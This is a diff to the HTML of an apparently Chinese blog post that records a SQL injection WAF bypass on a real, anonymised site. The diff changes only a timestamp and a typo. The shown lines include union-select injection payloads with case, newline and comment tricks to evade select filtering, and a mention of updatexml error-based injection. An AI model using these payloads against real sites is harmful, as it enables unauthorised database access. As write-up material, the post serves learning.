@@ -94,7 +94,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/6.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/7.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/8.png">
-<meta property="og:updated_time" content="2019-07-12T13:22:02.410Z">
+<meta property="og:updated_time" content="2019-09-16T02:40:54.063Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="纪录项目中一次简单的SQL注入bypass">
 <meta name="twitter:description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
@@ -418,7 +418,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union select user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union--+ //不拦截</span><br><span class="line"><span class="string">'union user()--+ //不拦截</span></span><br></pre></td></tr></table></figure>
 
 <p>这里猜测拦截了select</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union /*!select*/ user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union sElect user()--+ //拦截</span><br><span class="line"><span class="string">'union sel%0aect user()--+ //不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>union sel%0aect user()--+ //不拦截，但是报错</span><br><span class="line"><span class="string">'union sel/**/ect user()--+ //不拦截吗，但是报错</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union /*!select*/ user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union sElect user()--+ //拦截</span><br><span class="line"><span class="string">'union sel%0aect user()--+ //不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>union sel%0aect user()--+ //不拦截，但是报错</span><br><span class="line"><span class="string">'union sel/**/ect user()--+ //不拦截，但是报错</span></span><br></pre></td></tr></table></figure>
 
 <p>emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。</p>
 <p>稍稍普及一下updatexml报错注入</p>
